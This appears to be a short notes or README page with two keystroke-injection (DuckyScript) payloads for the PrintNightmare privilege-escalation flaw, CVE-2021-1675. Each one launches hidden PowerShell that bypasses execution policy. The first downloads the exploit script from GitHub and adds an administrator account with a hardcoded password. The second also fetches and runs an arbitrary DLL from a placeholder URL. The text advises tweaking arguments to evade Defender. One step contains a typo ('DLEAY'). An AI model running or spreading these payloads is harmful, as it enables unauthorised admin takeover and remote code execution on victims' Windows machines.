Reference https://github.com/calebstewart/CVE-2021-1675

You may need to supplement powershell arguments for a defined username and password for the new administrator in order to avoid being flagged by defender. Reference the GitHub above from the PowerShell script authors for documentation on the flags.

**CVE-2021-1675 - PrintNightmare LPE (PowerShell) -- Create an administrative user and spawn a command prompt as the new administrative user.**
```REM CVE-2021-1675 - PrintNightmare LPE (PowerShell) -- Create administrative user and spawn a command prompt as the new administrative user.
GUI r
DELAY 150
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1',\"$env:temp\cve20211675.ps1\"); Import-Module \"$env:temp\cve20211675.ps1\"; Invoke-Nightmare"
ENTER
DLEAY 1000
GUI r
DELAY 150
STRING cmd
DELAY 150
ENTER
DELAY 150
STRING runas /user:adm1n cmd.exe
ENTER
DELAY 150
STRING P@ssw0rd
DELAY 150
ENTER
```

**CVE-2021-1675 - PrintNightmare LPE (PowerShell) -- Hidden Payload DLL Executor**

Replace the `ESCAPED URL TO DLL HERE` with the URL to your desired DLL payload
```
REM CVE-2021-1675 - PrintNightmare LPE (PowerShell) -- Hidden Payload DLL Executor
GUI r
DELAY 150
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('ESCAPED URL TO DLL HERE',\"$env:temp\p4yl0ad.dll\"); IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1',\"$env:temp\cve20211675.ps1\"); Import-Module \"$env:temp\cve20211675.ps1\"; Invoke-Nightmare -DLL \"$env:temp\p4yl0ad.dll\""
ENTER
```